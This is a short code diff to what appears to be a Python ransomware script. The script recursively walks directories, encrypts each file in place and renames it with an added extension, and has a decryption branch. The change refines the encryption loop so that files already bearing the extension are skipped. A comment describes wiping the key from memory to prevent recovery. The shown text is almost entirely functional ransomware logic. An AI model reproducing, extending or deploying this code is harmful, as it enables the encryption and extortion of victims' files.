@@ -119,16 +119,16 @@ def main():
     # Recursively go through folders and encrypt/decrypt files
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
+            if encrypt and not file.endswith(extension):
+                modify.modify_file_inplace(file, crypt.encrypt)
+                os.rename(file, file + extension)
+                print("File changed from " + file + " to " + file + extension)
             if decrypt and file.endswith(extension):
                 modify.modify_file_inplace(file, crypt.encrypt)
                 file_original = os.path.splitext(file)[0]
                 os.rename(file, file_original)
                 print("File changed from " + file + " to " + file_original)
-            if encrypt:
-                modify.modify_file_inplace(file, crypt.encrypt)
-                os.rename(file, file + extension)
-                print("File changed from " + file + " to " + file + extension)
-
+                
     # This wipes the key out of memory
     # to avoid recovery by third party tools
     for _ in range(100):
